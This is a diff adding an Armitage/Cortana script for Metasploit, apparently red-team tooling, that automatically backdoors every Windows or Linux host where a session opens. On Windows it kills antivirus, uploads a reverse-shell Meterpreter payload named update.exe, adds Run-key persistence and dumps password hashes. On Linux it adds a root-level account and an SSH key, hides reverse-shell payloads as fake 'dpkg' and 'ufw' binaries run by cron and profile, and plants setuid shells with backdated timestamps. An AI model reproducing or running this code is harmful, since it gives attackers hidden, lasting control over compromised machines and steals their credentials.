@@ -1,0 +1,92 @@
+# To Do
+# Update hosts file with fake entries to break patching (evil grade?)
+global('%infected');
+$win_user = 'lls_USER';
+$win_pass = '@pplesauc3';
+$local_ip = lhost();
+
+on session_open {
+	$rhost = session_host($1);
+        if (host_os(session_host($1)) eq "Microsoft Windows") {
+		if (%infected[session_host($1)] != "1") {
+			say("Infecting " . session_host($1));
+			m_cmd($1, "getsystem");
+			m_cmd($1, "run killav");
+			m_cmd($1, "run metsvc");
+			
+			# Generate Payload
+			$r_lport = random_port();
+			$win_backdoor = generate("windows/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "exe");
+			$handle2 = openf(">/tmp/update.exe");
+                        writeb($handle2, $win_backdoor);
+                        closef($handle2);						
+					
+			m_cmd($1, "upload /tmp/update.exe c:\\\\WIndows\\\\System32\\\\"); 
+			m_cmd($1, "reg setval -k HKLM\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v update -d \"c:\\\\Windows\\\\System32\\\\update.exe\"");
+			m_cmd($1, "run persistence -X -i 60 -p 10000 -r $local_ip");
+			m_cmd($1, "run getgui -u $backdoor_user -p $backdoor_pass");
+			m_cmd($1, "run gettelnet -u $backdoor_user -p $backdoor_pass");
+			$rdp = "creds --add " . session_host($1) . " -p 3389 -u $win_user -P $win_pass";
+			cmd_async($rdp);
+			$tel = "creds --add " . session_host($1) . " -p 23 -u $win_user -P $win_pass";
+			cmd_async($tel);
+			m_cmd($1, "run hashdump");
+			%infected[session_host($1)] = "1";
+			handler("windows/meterpreter/reverse_tcp", $r_lport, %(LHOST => $local_ip));
+			handler("windows/meterpreter/reverse_tcp", "10000", %(LHOST => $local_ip));
+       	      		handler("windows/metsvc_bind_tcp", "31337", %(LHOST => $local_ip, RHOST => $rhost));
+		}
+	}
+        else if (host_os(session_host($1)) eq "Linux") {
+		if (%infected[session_host($1)] != "1") {
+			say("Infecting " . session_host($1));
+			s_cmd($1, "mkdir /root/.ssh");
+			# on load prompt for keys or generate?
+			$handle = openf("/opt/metasploit/msf3/data/armitage/id_dsa.pub");
+			$pub_key = readln($handle);
+			s_cmd($1, "echo $pub_key >> /root/.ssh/authorized_keys");
+			closef($handle);
+			s_cmd($1, "echo 'administrator:\$6\$W6D9sKYe\$tPihBsmoYXNNBfDhmkT30tYqMdCtMN.zn9HpczbzVd0YMw9P5dAQnjQ4KqUN/4IG5xs4t1SUZP5k82vi5UWGc0:15578:0:99999:7:::' >> /etc/shadow"); # pass = abc123
+			s_cmd($1, "echo 'administrator:x:0:0:nobody,,,,:/:/bin/bash' >>/etc/passwd");
+			$ssh = "creds --add " . session_host($1) . " -p 22 -u administrator -P abc123";
+		        cmd_async($ssh);
+        	
+			# Generate Payload
+			$r_lport = random_port();
+			$backdoor = generate("linux/x86/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "elf");
+			$handle2 = openf(">/tmp/linux_backdoor");
+			writeb($handle2, $backdoor);
+			closef($handle2);	
+	
+			# set cron job
+			s_cmd($1, "mkdir /etc/cron.5min");
+			s_cmd($1, "echo '*/5 * * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.5min )' >> /etc/crontab");
+			shell_upload($1, "/tmp/linux_backdoor", "/etc/cron.5min/dpkg");
+			s_cmd($1, "chmod 755 /etc/cron.5min/dpkg")
+			s_cmd($1, "chattr +i /etc/cron.5min/dpkg");
+		
+			# set profile 
+			shell_upload($1, "/tmp/linux_backdoor", "/usr/bin/ufw");
+			s_cmd($1, "chmod 775 /usr/bin/ufw");
+			s_cmd($1, "echo '/usr/bin/ufw &' >>/etc/profile");
+			s_cmd($1, "echo '/usr/bin/ufw &' >>/etc/skel/.profile");
+			s_cmd($1, "chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile");	
+	
+			# Create Backup Shell
+			s_cmd($1, "cp /bin/zsh /.kernel; chmod +sss /.kernel; touch -d '4 May 2004' /.kernel; chattr +i /.kernel");
+                	s_cmd($1, "cp /bin/tcsh /tmp/X11.auth; chmod +sss /tmp/X11.auth; touch -d '4 May 2004' /tmp/X11.auth");
+				
+			%infected[session_host($1)] = "1";		
+			
+			# Launch our aux shells
+			handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST => lhost()));
+			auxiliary("scanner/ssh/ssh_login_pubkey", @($rhost), %(USERNAME => 'root', KEY_FILE => '/opt/metasploit/msf3/data/armitage/id_dsa'));
+			login("scanner/ssh/ssh_login", @($rhost), "administrator", "abc123", %(LHOST => lhost(), LPORT => random_port()));
+		}
+	}
+	else {
+		say("Failed to infect " . session_host($1) . ":" . host_os(session_host($1)));
+	}
+
+}
+
